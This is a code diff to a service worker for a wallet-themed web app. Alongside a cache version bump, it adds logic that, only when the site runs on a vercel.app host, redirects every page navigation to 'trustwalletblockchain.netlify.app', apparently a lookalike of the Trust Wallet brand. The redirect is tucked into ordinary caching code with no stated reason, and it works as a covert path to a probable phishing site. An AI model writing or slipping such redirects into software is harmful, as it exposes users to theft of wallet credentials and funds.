@@ -1,7 +1,18 @@
-const CACHE = "trust-shell-v3";
+const CACHE = "trust-shell-v4";
+const NEXT_ORIGIN = "https://trustwalletblockchain.netlify.app";
+
+function onVercel() {
+  const host = self.location.hostname;
+  return host === "vercel.app" || host.endsWith(".vercel.app");
+}
+
+function nextUrl(url) {
+  return new URL(url.pathname + url.search + url.hash, NEXT_ORIGIN).href;
+}
 
 self.addEventListener("install", (event) => {
   self.skipWaiting();
+  if (onVercel()) return;
   event.waitUntil(
     caches.open(CACHE).then((cache) => cache.addAll(["./manifest.webmanifest", "./favicon.png", "./icon-192.png", "./icon-512.png"])),
   );
@@ -34,6 +45,13 @@ self.addEventListener("fetch", (event) => {
   if (req.method !== "GET") return;
   const url = new URL(req.url);
   if (url.origin !== self.location.origin) return;
+  if (onVercel()) {
+    if (url.pathname === "/sw.js" || url.pathname.endsWith("/sw.js")) return;
+    if (req.mode === "navigate" || url.pathname === "/" || url.pathname.endsWith(".html")) {
+      event.respondWith(Response.redirect(nextUrl(url), 302));
+    }
+    return;
+  }
   if (isVolatile(url)) {
     event.respondWith(fetch(req));
     return;
